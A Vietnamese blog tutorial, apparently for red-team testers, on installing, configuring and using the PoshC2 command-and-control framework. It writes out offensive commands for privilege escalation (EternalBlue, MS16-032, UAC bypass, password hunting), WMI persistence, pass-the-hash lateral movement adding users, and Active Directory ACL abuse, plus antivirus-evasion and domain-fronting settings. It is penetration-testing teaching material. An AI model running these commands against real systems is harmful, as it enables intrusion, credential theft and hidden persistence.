![](https://images.viblo.asia/c2a2ff63-4b91-4056-9778-1680c1798258.png)

Chuyện là từ trước tới giờ, khi thực hiện công việc Redteam mình thường sử dụng Meterpreter (Metasploit Framework) cho mục đích làm C&C (Command and control).Tuy nhiên vấn đề dần nảy sinh,khi mình cần test vào các công ty lớn, buộc phải control một số lượng máy khá nhiều.Việc phân chia theo Session  của Meterpreter làm đôi lúc mình rối tung. Mình nhầm lẫn giữa session của máy A với session của máy B. Nhầm lẫn giữa shell user và shell hệ thống, nhầm lẫn giữa shell trước và sau khi bị reboot.Từ đó mình chuyển hẳn sang sử dụng Cobalt Strike và thấy độ ưu việt vượt trội của nó. Mình quyết định gắn bó với Cobalt Strike mãi mãi... 🤡

Tuy nhiên một vấn đề khác lại nảy sinh, khi trong một số kỳ thi của Offensive Security, Cobalt Strike là thành phần đầu tiên bị cấm tiệt.Dùng Meterpreter thì ngại nên mình quyết định tìm một công cụ C2 tốt và đáp ứng đủ yêu cầu. Lân la trên các diễn đàn thì mình tìm được PoshC2.

# 1. Poshc2 là gì?

Theo định nghĩa trên website chính thức, Poshc2 là một  proxy aware C2 framework hỗ trợ công việc cho Pentester với mục đích Post-exploitation (*Privilege escalation & Persistent* ) và Lateral movement (*kiểu bạn hack vào máy A sau đó lợi dụng nó để hack vào máy B*). 

PoshC2 chủ yếu được viết bằng ngôn ngữ lập trình Python và tuân theo dạng module để người dùng có thể dễ dàng thêm các module của riêng họ. Nó đồng thời cũng hỗ trợ sẵn cho chúng ta nhiều dạng payload khác nhau, đa số thuộc nhóm Powershell, C#, C++, DLL, và Shellcode (Đặc biệt các payload này được update thường xuyên hơn so với Meterpreter, làm giảm khả năng bị phát hiện với AntiVirus)

Các tính năng đáng chú ý của PoshC2 bao gồm:

* Hỗ trợ Docker
*  Độ tùy biến của payload cao, có thể cấu hình thời gian payload tự lăn ra chết (killdate) 😃 
*  Các AV lởm khởm khó có thể detect được các payload của PoshC2
*  Hỗ trợ giao tiếp qua các kênh như Slack hay Pushover 
* Tính bảo mật C2 infrastructure cao, tránh bị hack ngược lại mất Zoombies 
* Miễn phí và mã nguồn mở 
* ...
* Được phép sử dụng trong các kỳ thi của Offsec
# 2. Cài đặt PoshC2

Về mặt lý thuyết, PoshC2 có thể được cài đặt trên bât kỳ hệ thống nào có Python3, tuy nhiên nó thường chỉ được thử nghiệm trên một số nền tảng phổ biến về hacking như Ubuntu hay Debian. Do bản thân PoshC2 chứa payload độc hại, nên chúng ta tránh cài đặt trên các hệ thống chạy các AntiVirus xịn như Kaspersky hay Windows Defender.

Để cài đặt trên Ubuntu, ta sử dụng câu lệnh sau:

```bash
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash
```


![](https://images.viblo.asia/1b1d3163-af5c-45d6-982c-65690a12becc.png)

Sau khi cài đặt thành công, ta nhận được thông tin sơ lược về cách sử dụng

![](https://images.viblo.asia/ffa2d49f-2d44-4357-b8d0-6155048cd649.png)

Theo đó, quy trình thực hiện sẽ như sau :

**Bước 1**: Sử `posh-project` để tạo một project mới

**Bước 2**: Sử dụng `posh-config` để cấu hình cho project vừa tạo

**Bước 3**: Sử dụng `posh-server` để create payload (ở lần đầu khởi tạo project) và hiển thị output command ở các lần tiếp theo

**Bước 4**: Sử dụng `posh` để login và tương tác với nạn nhân 


# 3. Thiết lập môi trường

## 3.1. Tạo một Project mới


```bash
posh-project -n [ten_project]
```
![](https://images.viblo.asia/2def4542-f85a-4955-be39-8c7fe8f3b35c.png)

Trong trường hợp ta có nhiều hơn một project, có thể sử dụng `-s` flag để chuyển đổi qua lại giữa các project với nhau

![](https://images.viblo.asia/76db7496-121f-43d9-bd96-1987d833d35b.png)

## 3.2. Cấu hình Project

```
posh-config
```

Sau khi sử dụng `posh-config` ta được chuyển hướng tới một file cấu hình như sau :

![](https://images.viblo.asia/03ebb020-4a34-407b-9496-687b979a78de.png)

Có kha khá thông số chúng ta cần chỉnh sửa (*trong đó 2 thông số đầu là quan trọng nhất*)

**Server Listen** (giống như ta cấu hình LHOST trong multi/handler)

```json
indIP: '0.0.0.0' //ip của hacker
BindPort: 443  //port của hacker
```

**Payload Host/Port** (giống như khi ta SET LHOST trong msfvenom)

```json
PayloadCommsHost: "https://127.0.0.1" # "https://www.domainfront.com:443,https://www.direct.com"
```

> Nếu chúng ta giữ nguyên BinPort là 443 thì khi đó PayloadCommHost sẽ được giữ nguyên là https://ip. Trong trường hợp ta đổi thông số BindPort sang port khác (ví dụ 4444), khi đó PayloadCommsHost sẽ có dạng "http://ip:4444" hoặc ta cần thêm thống số `PayloadCommsPort` vào file cấu hình 

**DomainFrontHeader** (trong trường hợp ta muốn fake thông tin hiển thị của payload trong Network Capture)

```json
DomainFrontHeader: ""  # "axpejfaaec.cloudfront.net,www.direct.com"
Referrer: ""  # optional
ServerHeader: "Apache"
UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36"  # This should be updated to match the environment, this is Chrome on 2020-03-2
```

**Kill Dates** (giới hạn thời gian hoạt động của payload)

```json
KillDate: "2999-12-01"  # yyyy-MM-dd
```

**Gửi thông tin thông qua Slack/Pushover**

```json
# Pushover - https://pushover.net/
Pushover_APIToken: ""
Pushover_APIUser: ""

# Slack - https://slack.com/
Slack_BotToken: "" # The token used by the application to authenticate. Get it from https://[YourSlackName].slack.com/apps/A0F7YS25R (swap out [YourSlackName]). Should start with xobo-.
Slack_UserID: "" # Found under a users profile (i.e UHEJYT2AA). Can also be "channel". 
Slack_Channel: "" # i.e #bots
```

**Process Migration**

```json
DefaultMigrationProcess: "C:\\Windows\\system32\\netsh.exe"  # Used in the PoshXX_migrate.exe payloads
```

**Cấu hình proxy**

```json
# SOCKS Proxying Options
SocksHost: "http://127.0.0.1:49031" # The host the C2 http requests communicate with - not the port the SOCKS client connects to. Most cases should be left like this and set in rewrite rules.

```

## 3.3. Posh-Server

Với các thông số đầy đủ, ta tiến hành sử dụng `posh-server`

Trong lần đầu khởi chạy (với một cấu hình mới), PoshC2 sẽ bắt đầu tạo các payloads - quá trình này sẽ mất khoảng 5-6 phút. 

![](https://images.viblo.asia/f690d12d-75c6-4900-98bb-90a4d9121816.png)

Payload được tạo thành công , chia thành  nhiều nhóm khác nhau như Powershell , C++, C# , DLL, Shellcode ... được lưu trữ tại /var/poshc2/[project_name]

![](https://images.viblo.asia/603352b3-1b5f-48f0-b8bc-c0c80fe1b44d.png)

## 3.4. Posh

Sau khi khởi chạy `Posh-Server` thành công, ta tiến hành sử dụng `posh` để "login" vào hệ thống. Nhưng khác với CobalStrike theo đúng nguyên tắc Server-Client multi Server , thì PoshC2 hơi "giả cầy" ở chỗ chỉ cung cấp username để đăng nhập trên cùng một Server với mục đích để dàng ghi log, chứ không phải cho mục đích xác thực. 

![](https://images.viblo.asia/c173a450-aa4e-45e1-af4d-8d5fa3112402.png)

 `posh` sẽ là nơi bạn input command còn `posh-server` sẽ là nơi hiển thị các output được trả về từ nạn nhân

![](https://images.viblo.asia/6933e0eb-7df7-468e-9084-6bc17f7b179d.png)

> Nếu username có dấu * thì payload  đang chạy với quyền administrator.

Ngoài ra, PoshC2 còn cung cấp một vài công cụ hữu ích cho chúng ta như: 

**posh-service** : Cấu hình PoshC2 như một serivce

**posh-stop-service** : Tắt cấu hình PoshC2 service

**posh-log** : Xem log hiển thị của PoshC2

**posh-update** : Update PoshC2

# 4. Sử dụng PoshC2 cho Post-Exploit

Sau khi payload  gửi  cho nạn nhân và được kích hoạt. Ta nhận được các ImplantID tương ứng với `1-2-3-4`.  Nhập trực tiếp các số này để tương tác với shell (*điều này thì mình chẳng thấy khác gì so với session của Meterpreter*)

![](https://images.viblo.asia/70abd497-b337-44cb-89f9-d729929d6ba7.png)



## Function

Sau khi kết nối thành công với nạn nhân. PoshC2 cung cấp cho chúng ta rất nhiều công cụ/tùy chọn để tấn công với nhiều kỹ thuật khác nhau:

**Privilege Escalation:** (Leo thang đặc quyền)

```
invoke-allchecks
Invoke-PsUACme -Payload "c:\temp\uac.exe" -method sysprep
get-mshotfixes | where-object {$_.hotfixid -eq "kb2852386"}
invoke-ms16-032
invoke-ms16-032-proxypayload
invoke-eternalblue -target 127.0.0.1  -initialgrooms 5 -maxattempts 1 -msfbind
get-gpppassword
get-content 'c:\programdata\mcafee\common framework\sitelist.xml'
dir -recurse | select-string -pattern 'password='
...

```

**File Management:**

```
download-file -source 'c:\temp dir\run.exe'
download-files -directory 'c:\temp dir\'
upload-file -source 'c:\temp\run.exe' -destination 'c:\temp\test.exe'
web-upload-file -from 'http://www.example.com/app.exe' -to 'c:\temp\app.exe'
...
```

**Persistence (with powershell.exe)**
```
Install-persistence 1,2,3
remove-persistence 1,2,3
install-servicelevel-persistence
remove-servicelevel-persistence
invoke-wmievent -name backup -command "powershell -enc abc" -hour 10 -minute 30
get-wmievent
remove-wmievent -name backup
...
```

```
* Persistence:
=============
installexe-persistence
removeexe-persistence

```

**Lateral Movement:**

```
get-externalip
test-adcredential -domain test -user ben -password password1
invoke-smblogin -target 192.168.100.20 -domain testdomain -username test -hash/-password
invoke-smbclient -Action Put -source c:\temp\test.doc -destination \test.com\c$\temp\test.doc -hash
invoke-smbexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
invoke-wmiexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
net view | net users | net localgroup administrators | net accounts /dom
whoami /groups | whoami /priv

```

**Active Directory Enumeration:**
```
invoke-aclscanner
invoke-aclscanner | Where-Object {$_.IdentityReference -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name}
get-objectacl -resolveguids -samaccountname john
add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
get-netuser -admincount | select samaccountname
get-netuser -uacfilter not_accountdisable -properties samaccountname,pwdlastset
get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
...

```

### Load module

![](https://images.viblo.asia/74d3dfbd-18e9-434f-9ece-855ca2f90fc8.png)

### SearchHelp

![](https://images.viblo.asia/365bfc81-f38c-45f7-a43a-8b4fceb38b38.png)

### Auto complete

![](https://images.viblo.asia/c173a450-aa4e-45e1-af4d-8d5fa3112402.png)


### Screenshot
![](https://images.viblo.asia/89f1c9e4-d653-45b5-adf6-7a248c6f8889.png)



# 5. Mở rộng PoshC2
PoshC2 được thiết kế dưới dạng module và được viết chủ yếu bằng python khiến cho việc tùy biến nó trở lên khá dễ dàng

### Adding Modules

```json
loadmodule Getuserspns.ps1
Getuserspns
```

### Adding Aliases

Để cấu hình aliases cho payload , ta chỉnh sửa trong `poshc2/client/Alias.py`

![](https://images.viblo.asia/0c375bd9-3d77-48fd-a28d-3c247c5b6a47.png)

### Adding Auto-completion

Auto-completion là một tính năng khá thú vị trong PoshC2. Nó hỗ trợ khả năng gợi ý và sử dụng lại các câu lệnh được thực hiện thường xuyên giúp tối ưu thời gian và công sức cho Pentester. Để cấu hình "Auto-completion" cho payload của chúng ta , ta tiến hành chỉnh sửa

`poshc2/client/Help.py`

![](https://images.viblo.asia/a5b8de01-cb4c-4f39-8f60-f8fee418880b.png)

### Adding Payload

Nếu không hài lòng với các payload có sẵn được PoshC2 tạo ra, chúng ta có thể **chỉnh sửa** hay **tạo mới** các payload của riêng mình

Để chỉnh sửa , ta tiến hành thay đổi các templates trong `resources/payload-templates` - nơi chứa các payload dạng  "thô" hoặc sửa quá trình tạo payload tại `poshc2/server/Payloads.py`

Nếu muốn tạo mới, ta tiến hành add payload của mình vào `poshc2/server/payloads/` (*Không có tài liệu mô tả chi tiết cách viết payload mới, ta phải dựa vào các payload cũ để tiến hành phân tích và mô phỏng theo*).

### Report

PoshC2 hỗ trợ công việc xuất report cho toàn bộ quá trình tấn công với 2 tùy chọn :

**Tạo report html**

```
generate-reports
```

**Tạo report CSV**

```
generate-csvs
```

> Một lưu ý nhỏ là thời gian hiển thị trên report sẽ căn cứ vào thời gian của máy tấn công, Do đó ta cần lưu ý chỉnh sửa cho khớp với thời gian thực tế. 

**Tham khảo**

https://github.com/nettitude/PoshC2/